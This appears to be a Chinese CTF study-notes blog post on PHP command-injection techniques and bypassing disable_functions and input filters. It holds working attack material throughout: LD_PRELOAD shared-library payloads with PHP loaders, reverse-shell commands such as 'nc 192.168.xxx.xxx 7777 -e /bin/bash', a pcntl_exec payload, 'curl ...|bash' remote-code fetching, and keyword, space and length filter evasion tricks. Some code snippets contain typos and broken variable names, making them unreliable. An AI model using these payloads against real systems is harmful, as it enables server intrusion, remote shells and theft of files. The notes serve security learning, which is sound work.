<p>var返回状态（忽略）</p>
<h3 id="passthru-string-command-int-return-var"><a href="#passthru-string-command-int-return-var" class="headerlink" title="passthru(string $command,int &amp;$return_var)"></a>passthru(string $command,int &amp;$return_var)</h3><p>command:执行的命令，var忽略</p>
<p>二进制数据（无关）</p>
<p><strong>直接回显，不需要print_r</strong></p>
<p>shell_exec(string $cmd)</p>
<p><strong>无回显，需要print_r，echo..</strong></p>
<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号`$cmd`"></a>反引号`$cmd`</h3><p><strong>无回显</strong></p>
<h3 id="popen-string-command-string-mode"><a href="#popen-string-command-string-mode" class="headerlink" title="popen(string $command,string $mode)"></a>popen(string $command,string $mode)</h3><p>mode(模式):’r’表示阅读,’w’表示写入。（命令执行后会把内容放到一个临时文档）</p>
<p>这个文档需要用fgets获取内容,用print_r输出内容</p>
<p><strong>‘w’模式支持自动回显，r模式需要用print_r</strong></p>
<h3 id="proc-open-1-2-3-4-5-6-不常用"><a href="#proc-open-1-2-3-4-5-6-不常用" class="headerlink" title="proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用"></a>proc_open(1,2,3,4,5,6)	&#x2F;&#x2F;不常用</h3><p>1,2,3必须</p>
<p>1:command;	2:descriptor_spec 定义数组内容	3:pipes:调用数组内容</p>
<p>descriptor_spec需要预定义，$pipes[1]写入，stream_get_contents($pipes[1]);读取，需要echo</p>
<h3 id="pcntl-exec-1-2-3-后续讲解"><a href="#pcntl-exec-1-2-3-后续讲解" class="headerlink" title="pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解"></a>pcntl_exec(1,2,3)	&#x2F;&#x2F;后续讲解</h3><p>此模块需额外安装</p>
<p>1:string $path为一个可执行二进制文件，在linux中<code>/bin/命令</code> 为二进制执行</p>
<p>2：array $args是传递给程序的参数</p>
<p>3:$envs是字符串数组，key&#x3D;&gt;value格式,key代表要传递的环境变量的名称，value代表环境变量的值</p>
<h2 id="二、替换绕过函数过滤"><a href="#二、替换绕过函数过滤" class="headerlink" title="二、替换绕过函数过滤"></a>二、替换绕过函数过滤</h2><p>过滤exec|system|popen|proc_open|`</p>
<p>用其他函数,如passthru(‘cmd’)绕过</p>
<h2 id="三、LD-PRELOAD绕过原理"><a href="#三、LD-PRELOAD绕过原理" class="headerlink" title="三、LD_PRELOAD绕过原理"></a>三、LD_PRELOAD绕过原理</h2><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
<h4 id="2-程序的链接"><a href="#2-程序的链接" class="headerlink" title="2.程序的链接"></a>2.程序的链接</h4><p>(1)静态链接:在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>(2)装入时动态链接:源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。<br>(3)运行时动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。<br>    对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。</p>
<h4 id="3-LD-PRELOAD"><a href="#3-LD-PRELOAD" class="headerlink" title="3.LD_PRELOAD"></a>3.LD_PRELOAD</h4><p>修改库文件</p>
<p>影响程序运行时的链接，加载别的动态链接可以，甚至覆盖正常的库</p>
<p>使用自己的或是更好的函数（无需别人的源码），也可以向别人的程序注入恶意程序</p>
<p>使用方法：</p>
<ol>
<li>mail 内嵌在php里</li>
<li>imagick需要扩展安装</li>
</ol>
<h5 id="1-mail"><a href="#1-mail" class="headerlink" title="1.mail"></a>1.mail</h5><p><code>vim demo.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>strace -o 1.txt -f php demo.php</code>把输出写到1.txt文件</p>
<p><code>cat 1.txt | grep execve</code>检查调用了那些子程序，调用了sendmail函数</p>
<p><code>readelf -Ws /usr/sbin/sendmail</code>查看调用了哪些库文件，其中geteuid库文件(获取用户uid信息)可以替换自己写的库文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;echo&#x27;小可爱，你邮件还能发出去么?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
<p>在此之前，需要修改demo,php更改库文件(esc wq保存)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时调用<code>php demo.php</code>输出小可爱，你邮件还能发出去么?</p>
<p>原理mail-&gt;sendmail()-&gt;geteuid()</p>
<p>绕过条件：</p>
<p>1.能够上传自己的.so文件;</p>
<p>2.能够控制环境变量的值(设置LD_PRELOAD变量)，比如putenv函数并且未被禁止;</p>
<p>3.存在可以控制PHP启动外部程序的函数并能执行(因为新进程启动将加载LDPRELOAD<br>中的.so文件)，比如mail()、imap mail()、mb_send_mail()和error_log()等。</p>
<h4 id="4-例题-81端口禁用函数例题"><a href="#4-例题-81端口禁用函数例题" class="headerlink" title="4.例题-81端口禁用函数例题"></a>4.例题-81端口禁用函数例题</h4><p>ld-prlooad防炸<br><code>dpkg-reconfigure dash</code>      yes</p>
<p><code>dpkg-reconfigure bash</code>       做完了改回来</p>
<h5 id="1-上传-so和-php"><a href="#1-上传-so和-php" class="headerlink" title="1.上传.so和.php"></a>1.上传.so和.php</h5><p>使用蚁剑链接可以上传下载文件（不能直接查看根目录）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);<span class="comment">//故去flag输出到/tmp/flag(可查看的目录就行)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;<span class="comment">//生成动作geteuid,执行payload</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD PRELOAD&quot;</span>);<span class="comment">//生成动作geteuid,执行payload结束调用</span></span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
<p>从&#x2F;root&#x2F;php找到demo.so，拷贝到windows</p>
<p>再编辑demo.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一起上传到蚁剑,网页访问&#x2F;demo.php，在tmp目录找到flag</p>
<p>*为了避免重复上传文件，更改c文件的system为<code>system(&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;)</code>反弹shell</p>
<p><code>nc -lvp 7777</code>监听7777端口</p>
<p>上传.so .php文件，访问demo.php，此时直接在linux终端输入命令即可</p>
<h5 id="EVIL-CMDLINE-不如nc"><a href="#EVIL-CMDLINE-不如nc" class="headerlink" title="EVIL_CMDLINE(不如nc)"></a>EVIL_CMDLINE(不如nc)</h5><p>把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令</p>
<p>demo.c-&gt;.so</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* cmdline = getenv(<span class="string">&quot;EVIL CMDLINE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD PRELOAD&quot;</span>)== <span class="literal">NULL</span>)&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenV(<span class="string">&quot;LD PRELOAD&quot;</span>);</span><br><span class="line">system(cmdline);<span class="comment">//放入system执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> =<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];<span class="comment">//要执行的命令</span></span><br><span class="line"><span class="variable">$out_path</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;outpath&quot;</span>];<span class="comment">//outpath命令执行结果输出到指定路径下的文件</span></span><br><span class="line"><span class="variable">$qvil_cmdline</span> = <span class="variable">$cmd</span>.<span class="string">&quot;&gt;&quot;</span>.<span class="variable">$out</span> path.<span class="string">&quot; 2&gt;&amp;1&quot;</span><span class="comment">//2&gt;&amp;1将标准错误重定向到标准输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;cmdline: &lt;/b&gt;&quot;</span>.<span class="variable">$evil</span> cmdline;<span class="comment">//打印显示实际在linux上执行的命令</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL CMDLINE=&quot;</span>.<span class="variable">$evil</span> cmdline);<span class="comment">//putenv改变环境变量的值</span></span><br><span class="line"><span class="variable">$so_path</span> =$ _REQUEST[<span class="string">&quot;sopath&quot;</span>];<span class="comment">//定义动态链接库</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD PRELOAD=&quot;</span>.<span class="variable">$so_path</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;b&gt;output: &lt;/b&gt;&lt;br /&gt;&quot;</span>.<span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>));<span class="comment">//调用输出环境变量的命令</span></span><br></pre></td></tr></table></figure>

<p>上传.so,.php</p>
<p>访问url&#x2F;demo.php?cmd&#x3D;ls&amp;outpath&#x3D;&#x2F;tmp&#x2F;benben&amp;sopath&#x3D;.&#x2F;demo.so</p>
<h2 id="四、蚁剑及pcntl绕过函数过滤"><a href="#四、蚁剑及pcntl绕过函数过滤" class="headerlink" title="四、蚁剑及pcntl绕过函数过滤"></a>四、蚁剑及pcntl绕过函数过滤</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h3><p><img src="/../images/0421-1.png"></p>
<p>利用蚁剑的插件绕过</p>
<p><img src="/../images/0421/0421-3.png"></p>
<p><img src="/../images/0421/0421-4.png"></p>
<p>蚁剑链接.antproxy.php文件，即可成功执行命令，在虚拟终端中利用<code>tac /flag</code>即可读取</p>
<p><strong>PHP7 GC with Certain Destructors UAF</strong>直接打开虚拟终端</p>
<h3 id="2-pcntl-exec"><a href="#2-pcntl-exec" class="headerlink" title="2.pcntl_exec"></a>2.pcntl_exec</h3><p>需要单独安装</p>
<p>pcntl_exec(1,2,3)</p>
<ol>
<li>string $path :必须是可执行二进制文件路径或一个在文件第一行制定了一个可执行文件路径标头的脚本(例如#!&#x2F;lusr&#x2F;local&#x2F;bin&#x2F;perl)</li>
<li>array $args:传递给程序的单数的字符串数组，用于执行命令</li>
<li>envs:环境变量，忽略</li>
</ol>
<p>例如*#&#x2F;bin&#x2F;bash* -c &#x2F;bin&#x2F;ls 前面是path 后面是args	-c为执行此二进制文件</p>
<p>前提：info信息中没有禁用pcntl_exec函数</p>
<p>pcntl_exec函数没有回显</p>
<ol>
<li>cat文件并输出到有权限读取的路径</li>
<li>shell反弹</li>
</ol>
<p>payload:<code>cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;));</code>注意是post还是get</p>
<p><code>nc -lvp 7777</code>监听端口即可</p>
<h2 id="五、操作系统连接符"><a href="#五、操作系统连接符" class="headerlink" title="五、操作系统连接符"></a>五、操作系统连接符</h2><p>拼接命令</p>
<h3 id="1-分号-；"><a href="#1-分号-；" class="headerlink" title="1.分号   ；"></a>1.分号   ；</h3><p>可以使命令都执行,类似sql堆叠注入</p>
<p>用法:可以提前闭合命令，或加上其他东西报错</p>
<p><code>-666;cat /flag;</code> 需要在页面源代码查看（tac指令可以直接显示）</p>
<h3 id="2"><a href="#2" class="headerlink" title="2.&amp;"></a>2.&amp;</h3><p><strong>必须url编码%26</strong></p>
<p>与；效果接近 ，同时执行多条命令</p>
<h3 id="3-与"><a href="#3-与" class="headerlink" title="3. &amp;&amp;	与"></a>3. &amp;&amp;	与</h3><p>如果前面命令执行成功，则执行后面命令，记得编码</p>
<p>?cmd&#x3D;%26%26pwd%26%26tac &#x2F;flag</p>
<h3 id="4-管道输出符"><a href="#4-管道输出符" class="headerlink" title="4.|	管道输出符"></a>4.|	管道输出符</h3><p>把前面的命令输出座位后面命令的输入，都会执行，但只显示后面执行的结果</p>
<p><code>echo &quot;ls -l&quot; | /bin/bash</code></p>
<h3 id="5-或"><a href="#5-或" class="headerlink" title="5.||	或"></a>5.||	或</h3><p>前面执行成功则后面的不执行，前面的失败后面的执行</p>
<p>应用:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=$ GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;<span class="comment">//八所偶遇输出全部扔进垃圾桶</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过方法:</p>
<p><code>cmd=ls||</code>忽略掉后边的指令</p>
<h2 id="六、空格过滤绕过"><a href="#六、空格过滤绕过" class="headerlink" title="六、空格过滤绕过"></a>六、空格过滤绕过</h2><p><code>$cmd= preg replace(&quot;# #&quot;,&quot;&quot;,$cmd);</code>正则替换</p>
<p>例如:ls -l查看文件详细信息将失效</p>
<p>绕过方法:</p>
<p>1.大括号{cat,flag.txt}</p>
<p>2.$IFS，${IFS}，$IFS$9 (内敛字段分隔符)     	在Linux系统中用加大括号界定</p>
<p>3.重定向字符&lt;,&lt;&gt;;</p>
<p>“&lt;”是输出重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备</p>
<p>cat&lt;flag.php;	cat&lt;&gt;flag.php(&gt;会创建文件)</p>
<p>4.url编码%09-&gt;Tab %20-&gt;[空格]</p>
<h2 id="七、文件名过滤绕过"><a href="#七、文件名过滤绕过" class="headerlink" title="七、文件名过滤绕过"></a>七、文件名过滤绕过</h2><p><code>!preg_match(&quot;/flag|system|php/i&quot;,$cmd)</code></p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符? *绕过"></a>1.通配符? *绕过</h4><p>cat fl?g.php</p>
<p>?在Linux可以替代字母，可以替代很多字母 ????.???</p>
<p>*可以进行模糊匹配,代表任何字符串 cat f*</p>
<h4 id="2-单引号，双引号绕过"><a href="#2-单引号，双引号绕过" class="headerlink" title="2.单引号，双引号绕过"></a>2.单引号，双引号绕过</h4><p>‘’，””空字符	插入空字符</p>
<p>fl””ag fl&#39;&#39;ag</p>
<h4 id="3-反斜杠"><a href="#3-反斜杠" class="headerlink" title="3.反斜杠"></a>3.反斜杠</h4><p>反斜杠是换行的标志</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f/lag==</span><br><span class="line">f</span><br><span class="line">lag</span><br></pre></td></tr></table></figure>

<h4 id="4-特殊变量"><a href="#4-特殊变量" class="headerlink" title="4.特殊变量"></a>4.特殊变量</h4><p>$1,$9,$@,$*无意义的字符</p>
<h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p><code>a=f;d=ag;c=l;cat \$a\$c\$b.txt</code></p>
<h4 id="6-利用Linux中的环境变量"><a href="#6-利用Linux中的环境变量" class="headerlink" title="6.利用Linux中的环境变量"></a>6.利用Linux中的环境变量</h4><p>试用环境变量里的字符执行变量</p>
<p><code>echo $PATH</code>会输出环境变量</p>
<p><code>$&#123;PATH：5:1&#125;</code>代表从第5个字符起取出1个字符</p>
<p><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></p>
<p>&#x2F;也是字符,从0开始数</p>
<p><code>#echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;g.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></p>
<h2 id="八、常见文件读取命令绕过"><a href="#八、常见文件读取命令绕过" class="headerlink" title="八、常见文件读取命令绕过"></a>八、常见文件读取命令绕过</h2><p><code>(!preg_match(&quot;/flag|php|cat|sort|shell\&#39;/i&quot;,$cmd)</code></p>
<p>绕过方法:</p>
<ol>
<li>tac:反向显示<br>自下而上</li>
<li>more:一页一页的显示档案内容 查看源代码</li>
<li>less:效果和more类似</li>
<li>tail:查看末尾几行（最后十行）</li>
<li>nl:显示的时候显示行号，查看源代码</li>
<li>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</li>
<li>xxd:读取二进制文档<br>左边二进制右边字符</li>
<li>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</li>
<li>uniq：报告或删除文件中重复的行</li>
<li>file -f:报错出具体内容</li>
<li>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</li>
<li>一定记得加分号</li>
</ol>
<h2 id="九、编码绕过"><a href="#九、编码绕过" class="headerlink" title="九、编码绕过"></a>九、编码绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p>命令编码后的字符串–绕过过滤—&gt;目标服务器—解码—&gt;执行命令</p>
<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">S = <span class="string">b&#x27;cat flag.php&#x27;</span></span><br><span class="line">e64= base64.b64encode(S)</span><br><span class="line"><span class="built_in">print</span>(e64)</span><br></pre></td></tr></table></figure>

<p><code>cat flag.php-&gt;Y2F0lGZsYWcucGhw</code><br><code>echo &quot;Y2F0lGZsYWcucGhw&quot; | base64 -d</code>管道输出符 -d表示decode解码</p>
<p>让命令执行passthru(‘  1 or 2 or 3  ‘)</p>
<ol>
<li><code>echo Y2F0lGZsYWcucGhw | base64 -d | /bin/bash</code> &#x2F;bin&#x2F;bash or bash or sh… </li>
<li>反引号</li>
<li>$()</li>
</ol>
<h3 id="2-base32"><a href="#2-base32" class="headerlink" title="2.base32"></a>2.base32</h3><p>与base64同</p>
<h3 id="3-HEX编码-acsii"><a href="#3-HEX编码-acsii" class="headerlink" title="3.HEX编码(acsii)"></a>3.HEX编码(acsii)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binacsii</span><br><span class="line">s = <span class="string">b&quot;tac flag&quot;</span></span><br><span class="line">h= binascii.b2a_hex(s)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br></pre></td></tr></table></figure>

<p><code>tac flag.php-&gt;74616320666c61672e706870</code><br>&#96;&#96;#echo “74616320666c61672e706870” | xxd -r-p | bash&#96;</p>
<h3 id="4-shellcode编码-16进制机器码"><a href="#4-shellcode编码-16进制机器码" class="headerlink" title="4.shellcode编码(16进制机器码)"></a>4.shellcode编码(16进制机器码)</h3><p>当服务器没装xxd可以用</p>
<p><code>tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</code>也就是把ascii每两个之前加\x</p>
<h2 id="十、无回显时间盲注"><a href="#十、无回显时间盲注" class="headerlink" title="十、无回显时间盲注"></a>十、无回显时间盲注</h2><p>适用条件：页面无法反弹shell，无回显，没有写入权限</p>
<p>原理：根据返回时间来判断（时间盲注）</p>
<p>函数：sleep 1 -&gt; 睡眠一秒<br>awk NR:逐行读取	cat flag.php | awk NR=&#x3D;1读取第一行<br>cut -c:读取第几个字符	cat flag.php | awk NR&#x3D;&#x3D;1 | cut -c 1读取第一行第一个字符<br>if [ ];then 条件为真执行;fi	finish表示条件为假什么也不执行,注意if之后必须有空格<code>if [2&gt;1];then echo &#39;right;fi&#39;</code></p>
<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></p>
<p>$()执行语句,字母不用加引号<br>时间盲注：<code>#if [$(cat flag |awk NR==2|cut -c 1)== F ];then sleep 2;fi</code></p>
<h2 id="十一、长度过滤绕过"><a href="#十一、长度过滤绕过" class="headerlink" title="十一、长度过滤绕过"></a>十一、长度过滤绕过</h2><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><p>1.&gt; <code>echo &quot;benben&quot; &gt; a</code>创建a文件，再次创建会覆盖	touch a为创建一个空文件a<br>2.&gt;&gt; <code>echo &quot;benben&quot; &gt;&gt; a</code>追加内容<br>3.\ 换行 <code>cat a等价于 c\换行a\换行 t\换行 a</code><br>4.ls -t	ls排序，按文件名排序：符号&gt;数字&gt;字符串<br>        ls -t排序，按时间顺序排序，最近&gt;最远<br>组合运用：把一些很短的文件名拼接成可执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;/fl\\ <span class="comment">#两个\\是把\实体化变为字符</span></span><br><span class="line">&gt;t\ \\ <span class="comment">#t后面要有\空格</span></span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;a</span><br><span class="line"><span class="built_in">cat</span> a</span><br><span class="line">----&gt;</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag <span class="comment">#也就是cat /flag</span></span><br><span class="line">----&gt;</span><br><span class="line">. a <span class="comment">#执行a: bash a or ./a or sh a</span></span><br></pre></td></tr></table></figure>

<p>5.dir：基本上和ls一样 优点：开头是d，次序靠前，按列输出不换行<br>$(dir *):把第一个文件名执行，第二个以后的作为参数输出，再执行<br>6.rev flag	把flag反向输出</p>
<h3 id="二、长度为七的绕过"><a href="#二、长度为七的绕过" class="headerlink" title="二、长度为七的绕过"></a>二、长度为七的绕过</h3><p><code>cat flag|nc 192.168.xxx.xxx 7777</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;7777</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">?cmd=&gt;xxx\\</span><br><span class="line">?cmd=&gt;xxx.\\</span><br><span class="line">?cmd=&gt;168.\\</span><br><span class="line">?cmd=&gt;192.\\</span><br><span class="line">?cmd=&gt;c\ \\</span><br><span class="line">?cmd=&gt;\|n\\ <span class="comment">#管道符要实体化</span></span><br><span class="line">?cmd=&gt;flag\\</span><br><span class="line">?cmd=&gt;t\ \\</span><br><span class="line">?cmd=&gt;ca\\</span><br><span class="line">?cmd=<span class="built_in">ls</span> -t&gt;a#刚好7字符</span><br><span class="line">?cmd=sh a</span><br></pre></td></tr></table></figure>

<h3 id="三、长度为五的绕过"><a href="#三、长度为五的绕过" class="headerlink" title="三、长度为五的绕过"></a>三、长度为五的绕过</h3><p>新的问题：1.ls -t&gt;a超过5个字符	2.空格&gt;\ \刚好5个字符，但是这个文件只能有一个，其他的空格无法构造</p>
<p>解决方法：<code>curl 192.168.1.161|bash</code>，将自己开的服务器的index.html代码执行，反弹shell</p>
<p>执行<code>nc 192.168.x.x 7777 -e /bin/bash</code></p>
<p>步骤一：构造ls -t&gt;y</p>
